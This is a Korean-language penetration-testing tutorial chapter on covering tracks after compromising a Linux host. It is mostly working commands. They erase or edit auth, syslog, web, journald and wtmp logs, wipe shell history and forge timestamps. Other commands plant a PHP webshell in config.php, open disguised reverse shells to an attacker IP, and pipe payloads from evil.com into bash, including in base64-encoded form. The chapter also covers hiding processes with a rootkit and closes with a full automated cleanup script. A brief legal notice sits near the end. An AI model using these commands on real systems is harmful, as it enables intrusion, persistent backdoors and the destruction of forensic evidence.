# Phase 8: Covering Tracks (흔적 제거)

침투 테스트 후 로그 및 흔적을 제거하여 탐지를 회피하는 방법을 다룹니다.

## 📋 목차

1. [Covering Tracks 기본 개념](#covering-tracks-기본-개념)
2. [로그 파일 삭제/수정](#로그-파일-삭제수정)
3. [히스토리 삭제](#히스토리-삭제)
4. [타임스탬프 조작](#타임스탬프-조작)
5. [프로세스 숨기기](#프로세스-숨기기)
6. [네트워크 연결 숨기기](#네트워크-연결-숨기기)
7. [파일 완전 삭제](#파일-완전-삭제)

---

## Covering Tracks 기본 개념

### 왜 흔적 제거가 필요한가?

```
1. 침투 탐지 시스템 (IDS) 회피
2. 포렌식 조사 방해
3. 침투 테스트 후 증거 제거
4. 지속성 유지
```

### 제거해야 할 흔적

```bash
# 1. 로그 파일
- /var/log/auth.log      (SSH 로그인 기록)
- /var/log/syslog        (시스템 로그)
- /var/log/apache2/      (웹 서버 접근 로그)
- /var/log/mysql/        (데이터베이스 로그)
- ~/.bash_history        (명령어 히스토리)

# 2. 프로세스 기록
- ps, top, htop 출력

# 3. 네트워크 연결
- netstat, ss 출력

# 4. 파일 생성/수정 흔적
- 타임스탬프 (mtime, atime, ctime)

# 5. 임시 파일
- /tmp/, /var/tmp/
```

---

## 로그 파일 삭제/수정

### 로그 위치 확인

```bash
# 주요 로그 파일
ls -la /var/log/

# Auth 로그 (SSH, sudo 기록)
/var/log/auth.log         # Debian/Ubuntu
/var/log/secure           # CentOS/RHEL

# 시스템 로그
/var/log/syslog
/var/log/messages

# 웹 서버 로그
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log

# 데이터베이스 로그
/var/log/mysql/error.log
/var/log/mysql/query.log
```

### 방법 1: 로그 파일 완전 삭제 (위험, 눈에 띔)

```bash
# Auth 로그 삭제
rm -f /var/log/auth.log
rm -f /var/log/auth.log.*

# 시스템 로그 삭제
rm -f /var/log/syslog
rm -f /var/log/messages

# 웹 서버 로그 삭제
rm -f /var/log/apache2/access.log
rm -f /var/log/apache2/error.log

# 주의: 로그 파일이 갑자기 사라지면 의심받음
```

### 방법 2: 특정 라인만 삭제 (더 은밀함)

```bash
# 특정 IP 주소 삭제
sed -i '/공격자IP/d' /var/log/auth.log
sed -i '/공격자IP/d' /var/log/apache2/access.log

# 특정 사용자 삭제
sed -i '/hacker/d' /var/log/auth.log

# 특정 시간대 삭제
sed -i '/Nov 26 14:3[0-9]/d' /var/log/syslog

# 백업 없이 즉시 삭제 (-i 옵션)
```

### 방법 3: 로그 파일 비우기

```bash
# 파일 내용만 비우기 (파일 자체는 유지)
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# 또는
cat /dev/null > /var/log/auth.log

# 더 자연스럽게: 최근 로그만 남기고 나머지 삭제
tail -n 100 /var/log/auth.log > /tmp/auth.log
cat /tmp/auth.log > /var/log/auth.log
rm /tmp/auth.log
```

### 방법 4: 로그 교체 (정상 로그로 대체)

```bash
# 깨끗한 로그 백업 (침투 전)
cp /var/log/auth.log /tmp/clean_auth.log

# 침투 후 원래 로그로 복원
cat /tmp/clean_auth.log > /var/log/auth.log
```

### journalctl 로그 삭제 (Systemd)

```bash
# journald 로그 확인
journalctl -xe

# journald 로그 삭제
rm -rf /var/log/journal/*
systemctl restart systemd-journald

# 또는 특정 기간만 삭제
journalctl --vacuum-time=1d
journalctl --vacuum-size=100M
```

---

## 히스토리 삭제

### Bash History

```bash
# 현재 세션 히스토리 비활성화
unset HISTFILE
export HISTFILESIZE=0
export HISTSIZE=0

# 이미 기록된 히스토리 삭제
history -c
cat /dev/null > ~/.bash_history

# 또는
rm ~/.bash_history
ln -s /dev/null ~/.bash_history  # 영구 비활성화

# Root 사용자 히스토리
rm /root/.bash_history
```

### 특정 명령만 삭제

```bash
# 마지막 명령 삭제
history -d -1

# 특정 라인 삭제
history | grep wget  # 라인 번호 확인
history -d 1234      # 해당 라인 삭제

# 패턴 매칭 삭제 (sed 사용)
sed -i '/wget.*shell.php/d' ~/.bash_history
```

### 히스토리에 남기지 않고 명령 실행

```bash
# 명령 앞에 공백 추가 (HISTCONTROL=ignorespace 설정 시)
 wget http://evil.com/shell.php

# 또는 히스토리 비활성화 후 명령 실행
set +o history
wget http://evil.com/shell.php
rm shell.php
set -o history
```

### MySQL History

```bash
# MySQL 명령어 히스토리 삭제
rm ~/.mysql_history
ln -s /dev/null ~/.mysql_history
```

---

## 타임스탬프 조작

### 파일 타임스탬프 확인

```bash
# stat 명령으로 타임스탬프 확인
stat /tmp/shell.php

# Access:  2025-11-26 14:30:00 (마지막 접근 시간)
# Modify:  2025-11-26 14:30:00 (마지막 수정 시간)
# Change:  2025-11-26 14:30:00 (마지막 메타데이터 변경 시간)
```

### touch를 사용한 타임스탬프 변경

```bash
# 다른 파일과 동일한 타임스탬프로 설정 (가장 자연스러움)
touch -r /etc/passwd /tmp/shell.php

# 특정 날짜로 설정
touch -t 202501010000 /tmp/shell.php
# YYYYMMDDHHMM

# 현재 시간으로 갱신
touch /tmp/shell.php
```

### 백도어 파일 타임스탬프 위장

```bash
# 백도어 설치 전 원본 타임스탬프 저장
stat /var/www/html/config.php > /tmp/.timestamp

# 백도어 설치
echo "<?php system(\$_GET['cmd']); ?>" >> /var/www/html/config.php

# 타임스탬프 복원
touch -r /tmp/.timestamp /var/www/html/config.php
```

---

## 프로세스 숨기기

### 프로세스 이름 변경

```bash
# exec -a 옵션으로 프로세스 이름 위장
exec -a "[kworker/0:0]" bash -i >& /dev/tcp/공격자IP/4444 0>&1

# 정상 프로세스처럼 보임
ps aux | grep kworker
```

### 프로세스 우선순위 낮추기 (탐지 회피)

```bash
# nice 값 조정 (CPU 사용량 최소화)
nice -n 19 ./backdoor.sh

# CPU 사용률 제한
cpulimit -l 10 -p $(pgrep backdoor)
```

### LKM Rootkit으로 프로세스 숨기기

```bash
# Diamorphine Rootkit (앞서 설명)
kill -63 <PID>  # 프로세스 숨기기
kill -64 0      # Rootkit 모듈 자체 숨기기
```

---

## 네트워크 연결 숨기기

### 네트워크 연결 확인

```bash
# 활성 연결 확인
netstat -antp
ss -antp

# Reverse Shell 연결 예시:
# tcp  0  0 3.35.218.180:12345  공격자IP:4444  ESTABLISHED  1234/bash
```

### LKM Rootkit으로 네트워크 연결 숨기기

```bash
# Rootkit 설치 후 특정 포트 숨기기
# Diamorphine, Reptile 등 사용
```

### 정상 포트 사용 (443, 80, 53)

```bash
# HTTPS (443) 포트로 위장
bash -i >& /dev/tcp/공격자IP/443 0>&1

# DNS (53) 포트로 위장
bash -i >& /dev/tcp/공격자IP/53 0>&1

# 정상 트래픽처럼 보임
```

---

## 파일 완전 삭제

### rm vs shred

```bash
# 일반 삭제 (복구 가능)
rm /tmp/shell.php

# 안전한 삭제 (복구 어려움)
shred -vfz -n 10 /tmp/shell.php

# 옵션:
# -v: 진행상황 표시
# -f: 쓰기 권한 강제 변경
# -z: 마지막에 0으로 덮어쓰기
# -n 10: 10번 랜덤 데이터로 덮어쓰기
```

### 디렉토리 완전 삭제

```bash
# 디렉토리 내 모든 파일 shred
find /tmp/exfil -type f -exec shred -vfz -n 3 {} \;
rm -rf /tmp/exfil
```

### SSD에서의 완전 삭제 (복잡함)

```bash
# SSD는 Wear Leveling으로 인해 shred 효과 없음
# TRIM 명령 사용
fstrim -v /

# 또는 암호화 사용 (사전에 준비)
```

---

## Utmp/Wtmp/Btmp 로그 제거

### Utmp/Wtmp/Btmp란?

```bash
# /var/run/utmp  : 현재 로그인한 사용자
# /var/log/wtmp  : 모든 로그인/로그아웃 기록
# /var/log/btmp  : 실패한 로그인 시도

# 확인
who          # utmp
last         # wtmp
lastb        # btmp
```

### 특정 사용자 로그 삭제

```bash
# utmpdump로 wtmp 확인
utmpdump /var/log/wtmp

# 특정 IP 삭제 (C 프로그램 필요)
# 또는 간단히 전체 삭제
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp
cat /dev/null > /var/run/utmp
```

---

## 자동화된 흔적 제거 스크립트

```bash
#!/bin/bash
# cleanup.sh - 침투 테스트 후 흔적 제거

echo "[*] Starting cleanup..."

# 1. 히스토리 삭제
unset HISTFILE
history -c
cat /dev/null > ~/.bash_history
cat /dev/null > /root/.bash_history

# 2. 로그 파일에서 공격자 IP 삭제
ATTACKER_IP="YOUR_KALI_IP"
for log in /var/log/auth.log /var/log/syslog /var/log/apache2/access.log; do
    if [ -f "$log" ]; then
        sed -i "/$ATTACKER_IP/d" "$log"
        echo "[+] Cleaned $log"
    fi
done

# 3. 백도어 파일 안전 삭제
for file in /tmp/shell.php /var/www/html/.cache/backdoor.php; do
    if [ -f "$file" ]; then
        shred -vfz -n 3 "$file"
        echo "[+] Shredded $file"
    fi
done

# 4. 임시 파일 삭제
rm -rf /tmp/.hidden
rm -rf /var/tmp/.backup

# 5. Cron Job 백도어 제거
crontab -l | grep -v "공격자IP" | crontab -
echo "[+] Cleaned cron jobs"

# 6. Systemd 백도어 제거
systemctl stop system-monitor.service 2>/dev/null
systemctl disable system-monitor.service 2>/dev/null
rm -f /etc/systemd/system/system-monitor.service
systemctl daemon-reload

# 7. SSH 키 제거
sed -i '/redteam@kali/d' /root/.ssh/authorized_keys
sed -i '/redteam@kali/d' /var/www/.ssh/authorized_keys

# 8. 계정 제거
userdel -r support 2>/dev/null
userdel -r backup 2>/dev/null

# 9. wtmp/btmp 로그 정리
cat /dev/null > /var/log/wtmp
cat /dev/null > /var/log/btmp

# 10. journald 로그 정리
journalctl --vacuum-time=1d

echo "[+] Cleanup complete!"
```

---

## 탐지 회피 모범 사례

### 최소 흔적 남기기

```bash
# 1. 메모리에서만 실행 (디스크에 쓰지 않음)
wget http://evil.com/script.sh -O - | bash

# 2. 명령어 체이닝 (히스토리에 남지 않음)
bash -c 'wget http://evil.com/shell.php && php shell.php && rm shell.php'

# 3. Base64 인코딩 (로그에서 명령어 숨김)
echo "d2dldCBodHRwOi8vZXZpbC5jb20vc2hlbGwucGhw" | base64 -d | bash
```

### 시스템 모니터링 확인

```bash
# 실행 중인 모니터링 도구 확인
ps aux | grep -E 'ossec|tripwire|aide|auditd|syslog'

# 로그 전송 확인
netstat -antp | grep -E ':514|:1514'  # Syslog 포트

# Auditd 규칙 확인
auditctl -l
```

---

## 포렌식 대응 고려사항

### 포렌식 조사 시 발견될 수 있는 것들

```
1. 삭제된 파일 복구 (ext4, NTFS)
2. 메모리 덤프 분석 (RAM에 남은 흔적)
3. 네트워크 패킷 캡처 (IDS, 방화벽 로그)
4. 파일 시스템 타임라인 분석
5. Rootkit 탐지 (chkrootkit, rkhunter)
```

### 대응 방법

```bash
# 1. 파일 복구 방지
shred -vfz -n 10 /tmp/sensitive_file

# 2. 메모리 덤프 방지
# - 일반적으로 불가능, 가능한 빨리 재부팅 유도

# 3. 네트워크 로그 우회
# - HTTPS, DNS, ICMP 터널 사용

# 4. 타임라인 조작
touch -r /etc/passwd /tmp/backdoor.sh

# 5. Rootkit 은닉
kill -64 0  # Diamorphine 자체 숨기기
```

---

## 법적 고지

- 흔적 제거는 **증거 인멸** 행위로 법적 처벌 대상
- **사전 승인된 침투 테스트**에만 사용
- 테스트 종료 후 **모든 변경 사항 복원** 필수
- **침투 테스트 보고서**에 모든 행위 기록

---

## 흔적 제거 체크리스트

- [ ] Bash 히스토리 삭제
- [ ] /var/log/auth.log 정리
- [ ] /var/log/syslog 정리
- [ ] 웹 서버 로그 정리
- [ ] wtmp/btmp 로그 정리
- [ ] 백도어 파일 shred 삭제
- [ ] Cron Job 제거
- [ ] Systemd 서비스 제거
- [ ] SSH 키 제거
- [ ] 생성한 계정 삭제
- [ ] 타임스탬프 복원

---

## 다음 단계

기본적인 침투 테스트 완료 후:
1. 고급 공격 기법 학습 (Phase 9)
2. 침투 테스트 보고서 작성

[→ Phase 9: Advanced Techniques로 이동](09_advanced_techniques.md)
